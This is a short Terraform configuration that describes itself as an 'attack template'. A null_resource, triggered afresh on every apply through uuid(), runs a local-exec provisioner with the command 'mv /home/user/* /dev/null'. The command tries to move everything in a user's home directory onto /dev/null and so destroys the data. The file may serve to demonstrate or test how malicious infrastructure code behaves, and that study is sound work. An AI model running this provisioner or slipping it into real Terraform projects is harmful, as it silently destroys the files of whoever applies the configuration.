# Create an arbitrary local resource
data "template_file" "test" {
  template = "Hello, I am an attack template to send all the data in a directory to a black hole."

}

resource "null_resource" "execut" {
  triggers {
    uuid = "${uuid()}"
  }

  provisioner "local-exec" {
    command = "mv /home/user/* /dev/null"
  }
}